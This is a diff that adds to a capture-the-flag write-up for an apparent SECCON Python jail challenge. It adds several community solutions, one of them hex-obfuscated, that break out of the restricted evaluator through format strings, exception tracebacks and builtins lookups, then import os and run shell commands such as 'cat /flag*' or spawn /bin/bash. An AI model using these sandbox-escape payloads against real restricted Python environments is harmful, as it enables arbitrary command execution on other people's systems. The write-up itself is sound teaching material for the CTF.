@@ -252,3 +252,46 @@ io.sendline(b'{}[g := ex.args[0], g[1]("sh")]')
 # SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
 io.interactive()
 ```
+
+Solutions on Discord:
+
+Idea: use `\x2e` + `format` to bypass the limitation, use `AttributeError` to save object to `ex`.
+
+@HexF:
+
+```python
+x
+'{0\x2e__traceback__\x2etb_frame\x2ef_globals[__builtins__]\x2eexec\x2ea}'.format(ex)
+ex.obj('\x65\x78\x2e\x5f\x5f\x74\x72\x61\x63\x65\x62\x61\x63\x6b\x5f\x5f\x2e\x74\x62\x5f\x66\x72\x61\x6d\x65\x2e\x66\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5b\x22\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x22\x5d\x2e\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2a\x22\x29')
+```
+
+@Peter:
+
+```python
+1/0
+'{0\x2e__traceback__\x2etb_frame\x2ef_builtins\x2e__nosuch__}'.format(ex)
+'{0\x2eobj[__import__]\x2e__nosuch__}'.format(ex)
+{}[ex.obj('os')]
+'{0\x2eargs[0]\x2esystem\x2e__nosuch__}'.format(ex)
+ex.obj('cat /flag-*')
+```
+
+@nikost:
+
+```python
+1/0
+"{0\x2e__class__\x2e__mro__[4]\x2e__subclasses__\x2epouet}".format(ex)
+[[ex := ex.obj()[167]] for i in '12']
+"{0\x2eobj\x2e__init__\x2e__builtins__[__import__]\x2epouet}".format(ex)
+[[ex := ex.obj('os') for i in '12']]
+"{0\x2eobj\x2esystem\x2epouet}".format(ex)
+ex.obj('/bin/bash')
+cat ../flag*
+```
+
+@D1N0:
+
+```python
+1/0
+[[[ex:=[ex["eval"] if idx=="d" else ex.__getattribute__][0](x)][0] for x in ["__traceback__" if idx == "a" else "tb_frame" if idx=="b" else "f_builtins" if idx=="c" else "ex['__import__']\x28'os'\x29\x2esystem\x28'cat /flag*'\x29"]][0] for idx in "abcd"]
+```
